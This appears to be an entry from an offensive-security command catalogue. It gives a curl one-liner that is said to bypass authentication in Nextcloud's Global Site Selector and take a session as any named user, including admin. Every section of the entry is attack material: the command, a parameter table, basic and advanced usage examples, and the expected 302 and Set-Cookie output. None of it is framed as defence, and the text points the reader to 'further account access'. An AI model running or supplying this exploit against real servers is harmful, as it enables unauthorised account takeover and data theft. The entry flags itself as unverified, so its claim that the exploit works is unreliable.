---
data: >-
  curl -X GET "https://target-nextcloud.com/login/select?user=targetuser" -c
  cookies.txt --verbose
tags:
  - web-exploit
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:43.008Z'
id: ef5bc307-a9cd-422f-9674-c03057ededf4
verified: false
validated: true
submitted: true
---
# curl-nextcloud-auth-bypass

## Command

```bash
curl -X GET "https://target-nextcloud.com/login/select?user=targetuser" -c cookies.txt --verbose
```

## Description

This curl command exploits the authentication bypass in Nextcloud's Global Site Selector by sending a direct request to select and log in as a target user without credentials. Use it to obtain a session cookie for further account access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method for the selector endpoint | Yes |
| `"https://target-nextcloud.com/login/select?user=targetuser"` | Target URL with username parameter; replace with actual host and user | Yes |
| `-c cookies.txt` | Saves session cookies to file for reuse | Yes |
| `--verbose` | Provides detailed request/response output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-nextcloud.com/login/select?user=admin" -c session_cookies.txt
```

### Advanced Usage

```bash
curl -X GET "https://target-nextcloud.com/login/select?user=targetuser" -c cookies.txt --verbose --header "User-Agent: Mozilla/5.0"
```

## Expected Output

Successful execution returns a 200 OK or 302 redirect with a Set-Cookie header containing a valid session token. Verbose mode shows: "< HTTP/1.1 302 Found" followed by location to dashboard. Failure (patched version) returns 403 or login prompt.

## Related

- [[Related Procedure|procedures/Exploit-Nextcloud-Global-Site-Selector-Auth-Bypass]]
